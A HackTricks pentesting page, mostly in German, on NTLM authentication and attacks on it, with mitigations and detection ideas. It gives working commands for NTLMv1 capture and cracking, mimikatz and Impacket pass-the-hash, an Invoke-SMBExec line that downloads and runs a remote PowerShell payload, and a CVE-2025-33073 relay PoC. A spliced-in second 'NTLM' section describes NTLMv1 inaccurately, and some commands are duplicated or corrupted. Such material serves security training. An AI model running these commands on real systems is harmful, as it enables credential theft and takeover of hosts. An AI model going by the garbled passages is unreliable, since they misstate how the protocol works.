# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

In Umgebungen, in denen **Windows XP und Server 2003** im Einsatz sind, werden LM (Lan Manager) hashes verwendet, obwohl weithin bekannt ist, dass diese leicht kompromittiert werden können. Ein bestimmter LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, weist darauf hin, dass LM nicht verwendet wird und den hash für einen leeren String darstellt.

Standardmäßig ist das **Kerberos**-Authentifizierungsprotokoll die primäre verwendete Methode. NTLM (NT LAN Manager) greift unter bestimmten Umständen ein: wenn kein Active Directory vorhanden ist, die domain nicht existiert, Kerberos aufgrund falscher Konfiguration nicht funktioniert oder Verbindungen über eine IP-Adresse statt über einen gültigen hostname versucht werden.

Das Vorhandensein des Headers **"NTLMSSP"** in Netzwerkpaketen signalisiert einen NTLM-Authentifizierungsprozess.

Die Unterstützung für die Authentifizierungsprotokolle - LM, NTLMv1 und NTLMv2 - wird durch eine spezielle DLL ermöglicht, die sich unter `%windir%\Windows\System32\msv1\_0.dll` befindet.

**Wichtige Punkte**:

- LM hashes sind verwundbar und ein leerer LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) bedeutet, dass er nicht verwendet wird.
- Kerberos ist die Standard-Authentifizierungsmethode, NTLM wird nur unter bestimmten Bedingungen verwendet.
- NTLM-Authentifizierungspakete sind am Header "NTLMSSP" erkennbar.
- Die Protokolle LM, NTLMv1 und NTLMv2 werden von der Systemdatei `msv1\_0.dll` unterstützt.

## LM, NTLMv1 and NTLMv2

You can check and configure which protocol will be used:

### GUI

Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).

![](<../../images/image (919).png>)

### Registry

This will set the level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Mögliche Werte:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. Der **user** gibt seine **credentials** ein
2. Die Client-Maschine **sendet eine authentication request** und übermittelt den **domain name** und den **username**
3. Der **server** sendet die **challenge**
4. Der **client encrypts** die **challenge** mit dem Hash des Passworts als key und sendet sie als response
5. Der **server sends** an den **Domain controller** den **domain name**, den **username**, die **challenge** und die **response**. Wenn **kein** Active Directory konfiguriert ist oder der domain name der Name des Servers ist, werden die credentials **lokal überprüft**.
6. Der **domain controller checks if everything is correct** und sendet die Informationen an den server

Der **server** und der **Domain Controller** können über den **Netlogon** server einen **Secure Channel** aufbauen, da der Domain Controller das Passwort des servers kennt (es befindet sich in der **NTDS.DIT** db).

### Local NTLM authentication Scheme

Die authentication ist dieselbe wie die oben erwähnte, **before but** der **server** kennt den **hash of the user**, der sich innerhalb der **SAM** file authentifizieren möchte. Statt also den Domain Controller zu fragen, **prüft der server selbst**, ob sich der user authentifizieren darf.

### NTLMv1 Challenge

Die **challenge length is 8 bytes** und die **response is 24 bytes** lang.

Der **hash NT (16bytes)** wird in **3 parts of 7bytes each** aufgeteilt (**7B + 7B + (2B+0x00\*5)**): der **last part is filled with zeros**. Dann wird die **challenge** **separately ciphered** mit jedem Teil, und die **resulting** ciphered bytes werden **joined**. Total: **8B + 8B + 8B = 24Bytes**.

**Problems**:

- Mangel an **randomness**
- Die 3 Teile können **separately attacked** werden, um den NT hash zu finden
- **DES is crackable**
- Der 3º key besteht immer aus **5 zeros**.
- Bei derselben **challenge** ist die **response** immer dieselbe. Daher kannst du dem Opfer als **challenge** die Zeichenfolge "**1122334455667788**" geben und die response mit **precomputed rainbow tables** angreifen.

### NTLMv1 attack

Heutzutage ist es weniger üblich, Umgebungen mit konfigurierter Unconstrained Delegation zu finden, aber das bedeutet nicht, dass du einen konfigurierten **Print Spooler service** nicht **abuse**n kannst.

Du könntest einige credentials/sessions, die du bereits im AD hast, **abuse**n, um den Drucker zu bitten, sich gegen einen **host under your control** zu authentifizieren. Dann kannst du mit `metasploit auxiliary/server/capture/smb` oder `responder` die authentication challenge auf `1122334455667788` setzen, den Authentifizierungsversuch erfassen und, falls er mit **NTLMv1** durchgeführt wurde, ihn **cracken**.\
Wenn du `responder` verwendest, könntest du versuchen, den Flag `--lm` zu **use**n, um die **authentication** zu **downgrade**n.\
_Beachte, dass für diese Technik die authentication mit NTLMv1 durchgeführt werden muss (NTLMv2 ist nicht gültig)._

Denk daran, dass der Drucker bei der authentication das Computerkonto verwendet, und Computerkonten nutzen **long and random passwords**, die du mit üblichen **dictionaries** wahrscheinlich nicht cracken kannst. Aber die **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), daher kannst du Dienste nutzen, die speziell für das Cracking von DES gedacht sind, und es so cracken (du könntest zum Beispiel [https://crack.sh/](https://crack.sh) oder [https://ntlmv1.com/](https://ntlmv1.com) verwenden).

### NTLMv1 attack with hashcat

NTLMv1 kann auch mit dem NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) gebrochen werden, das NTLMv1-Messages in einem Format aufbereitet, das mit hashcat geknackt werden kann.

Der command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
würde Folgendes ausgeben:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Erstelle eine Datei mit dem Inhalt von:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Führen Sie hashcat aus (verteilt ist am besten über ein Tool wie hashtopolis), da dies ansonsten mehrere Tage dauern wird.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In diesem Fall kennen wir das Passwort, und es ist password, also werden wir für Demo-Zwecke schummeln:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Wir müssen jetzt die hashcat-utilities verwenden, um die geknackten des keys in Teile des NTLM hash umzuwandeln:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Schließlich der letzte Teil:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM

### NTLMv1

NTLMv1 gibt es mit 3 Arten von Antworten:

- LM
- NT
- NTLM2 Session

Um sie zu verstehen, ist es wichtig, die NTLM-Authentifizierung zu verstehen:

- Es wird zuerst ein Server Challenge mit 8 Bytes gesendet.
- Basierend auf diesem Challenge und dem Passwort des Benutzers wird eine Antwort berechnet.

Die Antwort besteht aus 3 Teilen:

- 4 Bytes mit einem Brute-Force-Teil
- 8 Bytes mit einem Magic Constant
- 4 Bytes mit einem Brute-Force-Teil

Die 16 Bytes aus der Antwort werden als 3 Teile von 7 Bytes behandelt, um 3 DES Keys zu erstellen.

- Von den 3 Teilen werden 2 mit `md4` des Passworts und 1 mit einem Null-Byte gefüllt.
- Die 3 `DES`-Keys werden erstellt und das Challenge mit jedem von ihnen verschlüsselt.

Dies ist nur eine kurze Erklärung der Antwortberechnung.

Ein wichtiger Punkt ist, dass der `LM` Response auf unsicheren `DES` basiert und `DES` die 56-Bit-Keys in 7-Byte-Blöcke mit nur 7 Bit von jedem Byte aufteilt. Das macht ihn leicht angreifbar.

### NTLMv1 Hash Spraying/Bruteforcing

Hier ist der Ablauf eines `hash spraying`-Angriffs mit `NTLMv1`:

- Ein Benutzer meldet sich an einem von uns kontrollierten Server an.
- Wir senden einen `Server Challenge` an den Benutzer.
- Der Benutzer berechnet einen `NTLMv1`-Response und sendet ihn an uns zurück.
- Mit diesem `NTLMv1`-Response können wir die Antworten offline bruteforcen, bis wir den richtigen `NT hash` finden.

Der `NTLMv1`-Response wird auf eigene Weise berechnet, unter Berücksichtigung des Passworts und des `Server Challenge`. Die Antwort kann in 2 Teile aufgeteilt werden, die offline bruteforced werden können:

- Der `LM Response` ist bekannt dafür, dass er einfach bruteforced werden kann.
- Der `NT Response` kann auch bruteforced werden, da er vom Benutzerpasswort abhängt.

`Hash spraying`-Angriffe auf `NTLMv1` sind möglich, weil wir den `Server Challenge` kennen. Daher ist der `NTLMv1`-Response ein guter Zielwert, um eine Offline-`Password`-Überprüfung durchzuführen.

### NTLMv2

`NTLMv2` ist sicherer als `NTLMv1`, weil es den `NT hash` des Passworts verwendet. `NTLMv2` ist eine Verbesserung von `NTLMv1`, weil es `HMAC-MD5` und ein `NTLMv2 Client Challenge` verwendet.

`NTLMv2` ist eine Art `Challenge-Response`-Authentifizierung, bei der der Server dem Client eine `Server Challenge` sendet und der Client eine Antwort berechnet, indem er seinen `NT hash` mit dem `Server Challenge` und einem `NTLMv2 Client Challenge` kombiniert.

Der `NTLMv2 Response` enthält:

- den `NT proof string`
- den `Blob`

Der `NT proof string` wird mit `HMAC-MD5` aus dem `NT hash`, dem `Server Challenge` und dem `Blob` berechnet.

### NTLMv2 Hash Spraying/Bruteforcing

Auch wenn `NTLMv2` sicherer ist, können wir den `NTLMv2 Response` immer noch offline bruteforcen, wenn wir ihn haben. Der Unterschied ist, dass der Angriff deutlich langsamer ist.

Der Ablauf ist ähnlich:

- Ein Benutzer authentifiziert sich gegen einen von uns kontrollierten Server.
- Wir sammeln den `NTLMv2 Response`.
- Wir bruteforcen offline das Passwort, indem wir den `NTLMv2 Response` mit einem Kandidaten-`NT hash` vergleichen.

Der Vorteil von `NTLMv2` ist, dass das Passwort nicht direkt aus dem `NTLMv2 Response` abgeleitet werden kann. Der Nachteil ist, dass der Angriff immer noch möglich ist, wenn wir den `NTLMv2 Response` erfassen können.

### Relaying

`NTLM` kann auch für `Relaying`-Angriffe missbraucht werden. Dabei wird eine Authentifizierungsnachricht von einem Client abgefangen und an einen anderen Dienst weitergeleitet.

`NTLM`-`Relaying` funktioniert, weil der Angreifer nicht das Passwort kennt, sondern nur die Authentifizierungsnachricht. Wenn der Zielserver keine Schutzmaßnahmen wie `SMB signing`, `EPA` oder `channel binding` erzwingt, kann die Authentifizierung an ihn weitergeleitet werden.

### Schutzmaßnahmen

Um `NTLM`-basierte Angriffe zu erschweren oder zu verhindern, helfen unter anderem:

- `NTLM` deaktivieren, wo möglich
- `SMB signing` erzwingen
- `EPA` aktivieren
- `channel binding` verwenden
- starke Passwörter und MFA einsetzen

### Weitere Hinweise

`NTLM` wird in vielen `Windows`-Umgebungen noch immer verwendet, obwohl es veraltet ist. In modernen Umgebungen sollte, wenn möglich, auf sicherere Authentifizierungsverfahren umgestellt werden.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Die **Challenge-Länge beträgt 8 Bytes** und **2 Responses werden gesendet**: Eine ist **24 Bytes** lang und die Länge der **anderen** ist **variabel**.

**Die erste Response** wird erstellt, indem mit **HMAC_MD5** die **Zeichenkette** verschlüsselt wird, die aus dem **Client und der Domain** besteht, wobei als **key** der **hash MD4** des **NT hash** verwendet wird. Dann wird das **Ergebnis** als **key** verwendet, um mit **HMAC_MD5** die **Challenge** zu verschlüsseln. Dazu wird **eine Client-Challenge von 8 Bytes** hinzugefügt. Gesamt: 24 B.

**Die zweite Response** wird mit **mehreren Werten** erstellt (eine neue Client-Challenge, ein **Timestamp** um **replay attacks** zu vermeiden...)

Wenn du einen **pcap** hast, der einen erfolgreichen Authentifizierungsprozess mitgeschnitten hat, kannst du dieser Anleitung folgen, um die Domain, den Benutzer, die Challenge und die Response zu erhalten und zu versuchen, das Passwort zu knacken: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Sobald du den Hash des Opfers hast**, kannst du ihn verwenden, um es zu **imponieren**.\
Du musst ein **Tool** verwenden, das die **NTLM authentication using** diesen Hash **durchführt**, **oder** du könntest eine neue **sessionlogon** erstellen und diesen Hash in den **LSASS** injizieren, sodass bei jeder ausgeführten **NTLM authentication** dieser Hash verwendet wird. Die letzte Option ist das, was mimikatz tut.

**Bitte erinnere dich daran, dass du Pass-the-Hash attacks auch mit Computer-accounts durchführen kannst.**

### **Mimikatz**

**Muss als Administrator ausgeführt werden**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Dies wird einen Prozess starten, der den Benutzern gehören wird, die mimikatz gestartet haben, aber intern in LSASS sind die gespeicherten Credentials die innerhalb der mimikatz-Parameter. Dann kannst du auf Netzwerkressourcen zugreifen, als wärst du dieser Benutzer (ähnlich dem `runas /netonly`-Trick, aber du musst das Klartext-Passwort nicht kennen).

### Pass-the-Hash from linux

Du kannst Code Execution auf Windows-Maschinen mit Pass-the-Hash von Linux aus erhalten.\
[**Hier klicken, um zu lernen, wie es geht.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Du kannst [impacket binaries for Windows hier herunterladen](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In diesem Fall musst du einen Befehl angeben, cmd.exe und powershell.exe sind nicht gültig, um eine interaktive Shell zu erhalten)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Es gibt noch mehrere weitere Impacket binaries...

### Invoke-TheHash

Du kannst die powershell scripts von hier bekommen: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Diese Funktion ist eine **Mischung aus allen anderen**. Du kannst **mehrere Hosts** übergeben, einige **ausschließen** und die **Option** auswählen, die du verwenden möchtest (_SMBExec, WMIExec, SMBClient, SMBEnum_). Wenn du **eine beliebige** von **SMBExec** und **WMIExec** auswählst, aber **keinen** _**Command**_-Parameter angibst, wird nur **geprüft**, ob du **ausreichende Berechtigungen** hast.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Muss als Administrator ausgeführt werden**

Dieses Tool macht dasselbe wie mimikatz (LSASS-Speicher modifizieren).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manuelle Windows-Remote-Ausführung mit Benutzername und Passwort


{{#ref}}
../lateral-movement/
{{#endref}}

## Extrahieren von Credentials von einem Windows-Host

**Für weitere Informationen darüber**, [**wie man Credentials von einem Windows-Host erhält, solltest du diese Seite lesen**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue-Angriff

Der Internal Monologue-Angriff ist eine stealthy Credential-Extraction-Technik, die es einem Angreifer ermöglicht, NTLM-Hashes von der Maschine eines Opfers abzurufen, **ohne direkt mit dem LSASS-Prozess zu interagieren**. Im Gegensatz zu Mimikatz, das Hashes direkt aus dem Speicher liest und häufig von Endpoint-Security-Lösungen oder Credential Guard blockiert wird, nutzt dieser Angriff **lokale Aufrufe an das NTLM-Authentifizierungspaket (MSV1_0) über die Security Support Provider Interface (SSPI)**. Zuerst **senkt der Angreifer die NTLM-Einstellungen** (z. B. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), um sicherzustellen, dass NetNTLMv1 erlaubt ist. Danach imitiert er bestehende Benutzer-Tokens, die aus laufenden Prozessen gewonnen wurden, und löst lokal eine NTLM-Authentifizierung aus, um NetNTLMv1-Antworten mit einem bekannten Challenge zu erzeugen.

Nachdem diese NetNTLMv1-Antworten erfasst wurden, kann der Angreifer die ursprünglichen NTLM-Hashes schnell mithilfe von **vorkalkulierten Rainbow Tables** wiederherstellen und so weitere Pass-the-Hash-Angriffe für Lateral Movement ermöglichen. Entscheidend ist, dass der Internal Monologue-Angriff stealthy bleibt, weil er keinen Netzwerkverkehr erzeugt, keinen Code injiziert und keine direkten Memory Dumps auslöst, wodurch er für Verteidiger schwerer zu erkennen ist als traditionelle Methoden wie Mimikatz.

Wenn NetNTLMv1 nicht akzeptiert wird — etwa aufgrund erzwungener Sicherheitsrichtlinien — kann es sein, dass der Angreifer keine NetNTLMv1-Antwort erhält.

Um diesen Fall zu behandeln, wurde das Internal Monologue-Tool aktualisiert: Es ermittelt dynamisch ein Server-Token mit `AcceptSecurityContext()`, um bei einem NetNTLMv1-Fehlschlag weiterhin **NetNTLMv2-Antworten zu erfassen**. Obwohl NetNTLMv2 deutlich schwerer zu cracken ist, eröffnet es dennoch in begrenzten Fällen einen Weg für Relay-Angriffe oder Offline-Brute-Force.

Der PoC ist zu finden unter **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay und Responder

**Lies hier eine detailliertere Anleitung, wie man diese Angriffe durchführt:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## NTLM-Challenges aus einem Network Capture parsen

**Du kannst** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **verwenden**

## NTLM & Kerberos *Reflection* via serialisierte SPNs (CVE-2025-33073)

Windows enthält mehrere Mitigations, die *Reflection*-Angriffe verhindern sollen, bei denen eine von einem Host ausgehende NTLM- (oder Kerberos-)Authentifizierung zurück auf denselben Host weitergeleitet wird, um SYSTEM-Rechte zu erlangen.

Microsoft hat die meisten öffentlichen Ketten mit MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) und späteren Patches gebrochen. Allerdings zeigt **CVE-2025-33073**, dass die Schutzmaßnahmen weiterhin umgangen werden können, indem ausgenutzt wird, wie der **SMB-Client Service Principal Names (SPNs) abschneidet**, die *marshalled* (serialisiert) target-info enthalten.

### TL;DR des Bugs
1. Ein Angreifer registriert einen **DNS A-record**, dessen Label einen serialisierten SPN kodiert – z. B.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Das Opfer wird dazu gebracht, sich gegenüber diesem Hostnamen zu authentifizieren (PetitPotam, DFSCoerce usw.).
3. Wenn der SMB-Client den Ziel-String `cifs/srv11UWhRCAAAAA…` an `lsasrv!LsapCheckMarshalledTargetInfo` übergibt, **entfernt** der Aufruf von `CredUnmarshalTargetInfo` den serialisierten Blob und lässt **`cifs/srv1`** zurück.
4. `msv1_0!SspIsTargetLocalhost` (oder das Kerberos-Äquivalent) betrachtet das Ziel nun als *localhost*, weil der kurze Host-Teil mit dem Computernamen (`SRV1`) übereinstimmt.
5. Folglich setzt der Server `NTLMSSP_NEGOTIATE_LOCAL_CALL` und injiziert **LSASS’ SYSTEM-Access-Token** in den Kontext (für Kerberos wird ein als SYSTEM markierter Subsession-Key erstellt).
6. Das Weiterleiten dieser Authentifizierung mit `ntlmrelayx.py` **oder** `krbrelayx.py` gewährt volle SYSTEM-Rechte auf demselben Host.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* KB patch for **CVE-2025-33073** adds a check in `mrxsmb.sys::SmbCeCreateSrvCall` that blocks any SMB connection whose target contains marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Enforce **SMB signing** to prevent reflection even on unpatched hosts.
* Monitor DNS records resembling `*<base64>...*` and block coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Network captures with `NTLMSSP_NEGOTIATE_LOCAL_CALL` where client IP ≠ server IP.
* Kerberos AP-REQ containing a subsession key and a client principal equal to the hostname.
* Windows Event 4624/4648 SYSTEM logons immediately followed by remote SMB writes from the same host.

For the **March 2026** local reflection variant that abuses **SMB arbitrary ports** and **TCP connection reuse** to reach `NT AUTHORITY\SYSTEM`, see:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
